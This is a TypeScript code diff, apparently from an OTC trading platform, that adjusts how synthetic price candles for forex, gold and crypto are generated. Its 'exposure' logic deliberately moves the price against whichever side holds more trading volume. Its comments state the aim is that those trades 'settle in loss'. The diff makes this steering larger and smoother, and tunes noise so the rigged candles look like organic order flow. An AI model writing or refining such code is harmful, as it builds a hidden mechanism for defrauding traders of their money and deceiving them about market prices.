@@ -356,8 +356,8 @@ export function getDeterministicHistoricalCandle(
     : isCrypto
       ? base * 0.00028
       : isJpy
-        ? pipStep * 4.2
-        : pipStep * 3.6;
+        ? pipStep * 15.0
+        : pipStep * 16.5;
 
   const maxNaturalDelta = baseMaxDelta * sizeMultiplier;
   const rawDelta = rawBoundaryClose - rawBoundaryOpen;
@@ -428,10 +428,10 @@ export function getIntraCandlePriceActionNoise(
   if (progress <= 0 || progress >= 1.0) return 0;
   const elapsedSec = elapsed / 1000;
   const totalSec = timeStepMs / 1000;
-  // C2-continuous smooth Hermite envelope: guarantees exactly 0 velocity and 0 displacement at open,
-  // gradually easing in over 4.5 seconds with ZERO sudden kick or spike!
-  const openProgress = Math.min(1.0, elapsedSec / 4.5);
-  const closeProgress = Math.min(1.0, (totalSec - elapsedSec) / 3.5);
+  // C2-continuous smooth Hermite envelope: ensures 0 velocity and 0 displacement at exact open/close boundary,
+  // transitioning within 0.7s so candle actively breathes immediately without sitting still!
+  const openProgress = Math.min(1.0, elapsedSec / 0.75);
+  const closeProgress = Math.min(1.0, (totalSec - elapsedSec) / 0.65);
   const startEase = openProgress * openProgress * (3 - 2 * openProgress);
   const endEase = closeProgress * closeProgress * (3 - 2 * closeProgress);
   const envelope = startEase * endEase;
@@ -441,29 +441,32 @@ export function getIntraCandlePriceActionNoise(
   const tSec = nowMs / 1000;
   const pipStep = Math.pow(10, -precision);
 
-  // Multi-frequency natural order-flow waves:
+  // Multi-frequency natural order-flow harmonic waves matching Gold/Crypto:
   // Balanced harmonic waves for lively, fast, continuous micro-tick breathing
   // Fluid and responsive without exaggerated spikes or wild jumps!
-  const n1 = perlinSmooth1D(symSeed + 719, tSec / 3.0);  // 3.0s natural flow wave
-  const n2 = perlinSmooth1D(symSeed + 823, tSec / 1.4);  // 1.4s responsive price pulse
-  const n3 = perlinSmooth1D(symSeed + 941, tSec / 0.65); // 0.65s active micro-tick heartbeat
+  const n1 = perlinSmooth1D(symSeed + 719, tSec / 2.2);   // 2.2s primary order-flow swing
+  const n2 = perlinSmooth1D(symSeed + 823, tSec / 1.1);   // 1.1s natural impulse wave
+  const n3 = perlinSmooth1D(symSeed + 941, tSec / 0.50);  // 0.50s micro-tick heartbeat
+  const n4 = perlinSmooth1D(symSeed + 1051, tSec / 0.22); // 0.22s responsive tick vibration
 
   const isCrypto = symbol.includes('BTC') || symbol.includes('ETH');
   const isGold = symbol.includes('XAU') || symbol.includes('GOLD');
   const isJpy = symbol.includes('JPY');
 
   // Calibrated organic tick amplitude:
-  // High-resolution natural micro-ticks across pips (living and fluid, strictly without exaggerated jumps!)
+  // Exactly like Gold OTC (0.075 = ~7.5 units) and BTC OTC (base * 0.000065),
+  // Forex OTC pairs now have proportional micro-ticks (3.8 - 4.2 units of pipStep)
+  // so the last decimal constantly pulses and updates every 50-100ms with zero 2-3s pauses!
   const amp = isCrypto
     ? basePrice * 0.000065
     : isGold
       ? 0.075
       : isJpy
-        ? pipStep * 1.15
-        : pipStep * 0.85;
+        ? pipStep * 4.2
+        : pipStep * 3.8;
 
-  const rawPA = (n1 * 0.42 + n2 * 0.38 + n3 * 0.20) * amp * envelope;
-  return Number(rawPA.toFixed(precision));
+  const rawPA = (n1 * 0.28 + n2 * 0.32 + n3 * 0.25 + n4 * 0.15) * amp * envelope;
+  return rawPA;
 }
 
 export function getDeterministicActiveCandle(
@@ -512,8 +515,8 @@ export function getDeterministicActiveCandle(
     : isCrypto
       ? base * 0.00028
       : isJpy
-        ? pipStep * 4.2
-        : pipStep * 3.6;
+        ? pipStep * 15.0
+        : pipStep * 16.5;
 
   // Max natural single-candle body drift with mixed sizing
   const maxNaturalDelta = baseMaxDelta * sizeMultiplier;
@@ -532,62 +535,50 @@ export function getDeterministicActiveCandle(
   let effectiveTargetClose = targetClose;
 
   if (exposure && exposure.enabled === true && exposure.biasDirection !== 'NEUTRAL') {
+    // Decisive subtle delta guaranteeing clean loss closure (1.6 pips on Forex, $0.70 on Gold, $25 on BTC)
     const subtleDelta = isGold
-      ? 0.09
+      ? 0.70
       : isCrypto
-        ? base * 0.00009
+        ? base * 0.00035
         : isJpy
-          ? pipStep * 1.2
-          : pipStep * 0.85;
+          ? pipStep * 20
+          : pipStep * 16;
 
     const maxAllowedBody = isGold
-      ? 0.28
+      ? 1.80
       : isCrypto
-        ? base * 0.00025
+        ? base * 0.0012
         : isJpy
-          ? pipStep * 3.8
-          : pipStep * 3.2;
+          ? pipStep * 45
+          : pipStep * 40;
 
     let targetShift = 0;
     if (exposure.biasDirection === 'DOWN') {
+      // Heavier volume on UP -> Steer market DOWN below entry price so UP trades settle in loss
       let desired = candleOpen - subtleDelta;
       if (exposure.heavyEntryPrice && Number.isFinite(exposure.heavyEntryPrice)) {
         desired = Math.min(desired, exposure.heavyEntryPrice - subtleDelta);
       }
       desired = Math.max(candleOpen - maxAllowedBody, desired);
-      if (targetClose < desired) {
-        desired = Math.max(candleOpen - maxAllowedBody, targetClose);
-      }
       targetShift = desired - targetClose;
     } else if (exposure.biasDirection === 'UP') {
+      // Heavier volume on DOWN -> Steer market UP above entry price so DOWN trades settle in loss
       let desired = candleOpen + subtleDelta;
       if (exposure.heavyEntryPrice && Number.isFinite(exposure.heavyEntryPrice)) {
         desired = Math.max(desired, exposure.heavyEntryPrice + subtleDelta);
       }
       desired = Math.min(candleOpen + maxAllowedBody, desired);
-      if (targetClose > desired) {
-        desired = Math.min(candleOpen + maxAllowedBody, targetClose);
-      }
       targetShift = desired - targetClose;
     }
 
-    // Dynamic Drift Smoothing:
-    // In the last 15-20 seconds (progress >= 0.70), smoothly steer price toward targetShift
-    // using a smooth Sinusoidal / Bézier transition with natural micro-waves (NO straight vertical spikes!)
-    if (progress >= 0.70) {
-      const driftProgress = (progress - 0.70) / 0.30;
-      const sineEase = (1 - Math.cos(driftProgress * Math.PI)) / 2;
-      const rejectionWave = Math.sin(driftProgress * Math.PI * 3) * (subtleDelta * 0.18) * (1 - driftProgress);
-      effectiveTargetClose = targetClose + (targetShift * sineEase) + rejectionWave;
-    } else {
-      const earlyProgress = progress / 0.70;
-      const earlyEase = earlyProgress * 0.15;
-      effectiveTargetClose = targetClose + (targetShift * earlyEase);
-    }
+    // Natural progressive cosine ease:
+    // Seamlessly glides price across the entire candle duration with ZERO jumps or abrupt snapping
+    const smoothEase = (1 - Math.cos(progress * Math.PI)) / 2;
+    effectiveTargetClose = targetClose + (targetShift * smoothEase);
   }
 
   // Smooth base trajectory glides toward effectiveTargetClose
-  const baseLivePrice = Number((candleOpen + (effectiveTargetClose - candleOpen) * smoothProgress).toFixed(precision));
+  const baseLivePrice = candleOpen + (effectiveTargetClose - candleOpen) * smoothProgress;
 
   // Organic order-flow micro-ticks (bell envelope ensures strictly 0 at open and 0 at close)
   const paOffset = getIntraCandlePriceActionNoise(market.symbol, base, precision, nowMs, currentBucketTimeMs, timeStepMs);
